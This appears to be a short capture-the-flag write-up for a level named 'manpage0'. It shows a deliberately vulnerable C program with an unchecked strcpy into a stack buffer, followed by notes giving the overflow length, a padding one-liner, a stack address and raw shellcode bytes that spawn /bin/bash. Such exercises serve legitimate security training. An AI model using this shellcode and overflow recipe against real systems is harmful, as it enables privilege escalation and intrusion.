##manpage0

```
manpage0.c

//quick warmup
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]){
    char buf[256];
    setuid( getuid() );
    strcpy(buf, argv[1]);
    return 0;
}
```
* overflow length: 272
* /manpage/manpage0 `python -c "print 'A'* 272"`
* idea: shellcode
* start address: 0xffffd520
* `\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68`
